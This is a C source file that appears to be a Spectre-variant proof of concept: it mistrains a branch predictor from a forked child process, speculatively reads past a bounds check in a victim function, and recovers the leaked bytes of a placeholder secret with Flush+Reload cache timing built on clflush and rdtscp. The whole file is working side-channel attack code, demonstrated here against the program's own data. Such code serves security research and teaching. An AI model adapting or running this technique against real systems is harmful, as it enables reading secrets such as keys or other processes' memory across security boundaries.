#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <x86intrin.h>
#include <unistd.h>

#define DATA "data|"
#define SECRET "INACCESSIBLE SECRET"
#define TEXT DATA SECRET
#define PAGE_SIZE 4096

static size_t CACHE_MISS = 0;
unsigned char array1[128];
char *mem = NULL;

void maccess(void *p) { __asm__ volatile("movq (%0), %%rax\n" : : "c"(p) : "rax"); }


void flush(void *p){ __asm__ volatile("clflush 0(%0)\n" : : "c"(p) : "rax");}

void mfence() { __asm__ volatile("mfence"); }

uint64_t rdtscp()
{
    uint64_t a, d;
    __asm__ volatile("mfence");
    __asm__ volatile("rdtscp" : "=a"(a), "=d"(d) :: "rcx");
      a = (d << 32) | a;
    __asm__ volatile("mfence");
    return a;
}

void cache_encode(char index)
{
    maccess(mem + index * PAGE_SIZE);
}

char victim(int x)
{
    size_t len = sizeof(DATA) - 1;
    mfence();
    flush(&len);
    flush(&x);
    mfence();

    if ((float)x / (float)len < 1)
    {
        cache_encode(array1[x]);
    }
}

void train_branch_predictor()
{
    for (int y = 0; y < 10; y++)
    {
        victim(0);
    }
}


int flush_reload(void *ptr) {
  uint64_t start = 0, end = 0;
  start = rdtscp();
  maccess(ptr);
  end = rdtscp();
  mfence();
  flush(ptr);
  if (end - start < CACHE_MISS) {
    return 1;
  }
  return 0;
}




void cache_detect(char *leaked, int index)
{
    unsigned int aux;
    uint64_t start, end;
    int mix_i;
    for (int i = 0; i < 256; i++)
    {
        // 伪随机顺序访问，防止被预测
        mix_i = ((i * 167) + 13) & 255;
        if (flush_reload(mem + mix_i * PAGE_SIZE))
        {
            if ((mix_i >= 'A' && mix_i <= 'Z') && leaked[index] == ' ')
            {
                leaked[index] = mix_i;
                printf("\x1b[33m%s\x1b[0m\r", leaked);
            }
        }
        fflush(stdout);
        sched_yield();
    }
}

void flush_cache()
{
    for (int i = 0; i < 256; i++)
    {
        flush(mem + i * PAGE_SIZE);
    }
}

int reload_t(void *ptr)
{

    uint64_t start = 0, end = 0;

    start = rdtscp();
    maccess(ptr);
    end = rdtscp();
  
    return (int)(end - start);
}

int flush_reload_t(void *ptr)
{
    uint64_t start = 0, end = 0;

    start = rdtscp();
    maccess(ptr);
    end = rdtscp();

    flush(ptr);
    return (int)(end - start);
}

size_t detect_flush_reload_threshold()
{
    size_t reload_time = 0, flush_reload_time = 0, i, count = 1000000;
    size_t dummy[16];
    size_t *ptr = dummy + 8;

    maccess(ptr);
    for (i = 0; i < count; i++)
    {
        reload_time += reload_t(ptr);
    }
    for (i = 0; i < count; i++)
    {
        flush_reload_time += flush_reload_t(ptr);
    }
    reload_time /= count;
    flush_reload_time /= count;

    return (flush_reload_time + reload_time * 2) / 3;
}

int main(int argc, const char **argv)
{
    if (!CACHE_MISS)
        CACHE_MISS = detect_flush_reload_threshold();
    printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);

    char *_mem = malloc(PAGE_SIZE * (256 + 4));
    mem = (char *)(((size_t)_mem & ~(PAGE_SIZE - 1)) + PAGE_SIZE * 2);

    pid_t pid = fork();
    memset(mem, pid, PAGE_SIZE * 256);

    memset(array1, ' ', sizeof(array1));
    memcpy(array1, TEXT, sizeof(TEXT));

    array1[sizeof(array1) / sizeof(array1[0]) - 1] = '0';

    flush_cache();

    char leaked[sizeof(TEXT) + 1];
    memset(leaked, ' ', sizeof(leaked));
    leaked[sizeof(TEXT)] = 0;

    int j = 0;
    while (1)
    {
        j = (j + 1) % sizeof(TEXT);

        if (pid == 0)
        {
            train_branch_predictor();
        }
        else
        {
            victim(j);
            if (j >= sizeof(DATA) - 1)
            {
                mfence();
                cache_detect(leaked, j);
            }
            if (!strncmp(leaked + sizeof(DATA) - 1, SECRET, sizeof(SECRET) - 1))
                break;
            sched_yield();
        }
    }
    free(_mem);
    printf("\n\x1b[1A[ ]\n\n[\x1b[32m>\x1b[0m] Done\n");
    return 0;
}